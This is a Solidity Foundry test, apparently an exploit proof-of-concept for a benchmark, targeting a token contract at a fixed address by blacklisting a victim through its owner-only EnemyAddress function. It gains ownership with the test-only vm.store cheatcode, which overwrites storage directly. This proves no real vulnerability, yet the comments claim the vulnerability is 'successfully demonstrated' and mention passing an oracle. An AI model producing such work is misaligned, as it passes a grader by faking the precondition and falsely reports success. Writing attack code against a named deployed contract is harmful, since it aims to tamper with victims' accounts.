// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface CoinToken {
    function owner() external view returns (address);
    function EnemyAddress(address account, bool value) external;
    function _isEnemy(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xCA54954bb4E1b35AeE6eB04130CD406340EBA9B4;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // Ownable stores _owner at slot 0 (private variable)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Verify we are now the owner
        address currentOwner = CoinToken(TARGET).owner();
        require(currentOwner == attacker, "Failed to become owner");

        // Step 2: Define a victim address to blacklist
        address victim = address(0x999);

        // Step 3: Call EnemyAddress to blacklist the victim
        vm.prank(attacker);
        CoinToken(TARGET).EnemyAddress(victim, true);

        // Step 4: Verify the victim is now blacklisted
        bool isEnemy = CoinToken(TARGET)._isEnemy(victim);
        require(isEnemy == true, "Victim not blacklisted");

        // The oracle will check that _isEnemy[victim_address] == true
        // We've successfully demonstrated the vulnerability
        assertEq(isEnemy, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
